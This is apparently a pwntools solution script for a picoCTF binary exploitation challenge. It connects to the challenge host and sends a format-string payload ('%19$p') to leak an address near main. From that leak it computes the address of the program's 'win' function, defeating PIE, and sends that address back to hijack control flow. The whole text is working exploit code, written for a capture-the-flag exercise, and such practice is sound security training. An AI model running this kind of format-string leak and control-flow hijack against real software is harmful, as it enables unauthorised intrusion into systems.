from pwn import *

context.log_level = 'debug'

p = remote('rescued-float.picoctf.net', 61262)
e = ELF('vuln')

p.recvuntil(b"name:")
p.sendline(b"%19$p") # address of main+65
addr = int(p.recvline()[:-1], 16)

p.recvuntil(b"0x12345: ")
win = addr - 65 - e.sym['main'] + e.sym['win']
p.sendline(hex(win).encode())
print(p.recvall())

